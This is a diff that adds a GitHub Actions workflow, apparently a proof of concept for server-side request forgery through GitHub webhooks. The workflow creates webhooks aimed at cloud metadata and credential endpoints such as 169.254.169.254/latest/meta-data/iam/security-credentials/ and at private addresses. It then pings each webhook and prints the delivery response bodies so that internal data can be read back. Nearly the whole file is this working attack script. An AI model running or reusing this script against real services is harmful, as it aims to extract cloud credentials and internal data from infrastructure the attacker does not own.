@@ -1,0 +1,81 @@
+name: SSRF Proof
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  ssrf-test:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+    steps:
+      - name: Test webhook SSRF
+        run: |
+          echo "=== SSRF VIA WEBHOOK TEST ==="
+          
+          # Create webhooks to internal targets
+          TARGETS=(
+            "http://169.254.169.254/latest/meta-data/"
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            "http://169.254.170.2/v2/credentials"
+            "http://192.168.1.1/"
+            "http://10.0.0.1/"
+          )
+          
+          for TARGET in "${TARGETS[@]}"; do
+            echo ""
+            echo "--- Testing: $TARGET ---"
+            
+            # Create webhook
+            HOOK_ID=$(gh api repos/${{ github.repository }}/hooks \
+              -f name=web \
+              -f 'events[]=push' \
+              -f active=true \
+              -f 'config[url]='"$TARGET" \
+              -f 'config[content_type]=json' \
+              -f 'config[insecure_ssl]=1' \
+              --jq '.id' 2>/dev/null || echo "FAILED")
+            
+            if [ "$HOOK_ID" = "FAILED" ] || [ -z "$HOOK_ID" ]; then
+              echo "  Webhook creation BLOCKED for $TARGET"
+              continue
+            fi
+            
+            echo "  Webhook created: $HOOK_ID"
+            
+            # Ping the webhook
+            gh api repos/${{ github.repository }}/hooks/$HOOK_ID/pings -X POST 2>/dev/null
+            sleep 3
+            
+            # Check delivery
+            DELIVERY=$(gh api repos/${{ github.repository }}/hooks/$HOOK_ID/deliveries \
+              --jq '.[0] | {id, status_code, status}' 2>/dev/null)
+            echo "  Delivery: $DELIVERY"
+            
+            # Get full delivery details
+            DELIVERY_ID=$(echo "$DELIVERY" | jq -r '.id // empty')
+            if [ -n "$DELIVERY_ID" ]; then
+              DETAIL=$(gh api repos/${{ github.repository }}/hooks/$HOOK_ID/deliveries/$DELIVERY_ID \
+                --jq '{status_code: .status_code, response_headers: .response.headers, response_body: .response.payload}' 2>/dev/null)
+              echo "  Response details: $DETAIL"
+            fi
+            
+            # Clean up
+            gh api repos/${{ github.repository }}/hooks/$HOOK_ID -X DELETE 2>/dev/null
+          done
+          
+          echo ""
+          echo "=== LOCALHOST COMPARISON ==="
+          # Try localhost (should be blocked)
+          HOOK_ID=$(gh api repos/${{ github.repository }}/hooks \
+            -f name=web \
+            -f 'events[]=push' \
+            -f active=true \
+            -f 'config[url]=http://127.0.0.1/' \
+            -f 'config[content_type]=json' \
+            --jq '.id' 2>/dev/null || echo "BLOCKED")
+          echo "  localhost webhook: $HOOK_ID (should be BLOCKED)"
+          
+          echo ""
+          echo "=== CONCLUSION ==="
+          echo "If IMDS (169.254.169.254) webhooks succeed but localhost is blocked,"
+          echo "this proves INCOMPLETE SSRF protection in GitHub webhooks."
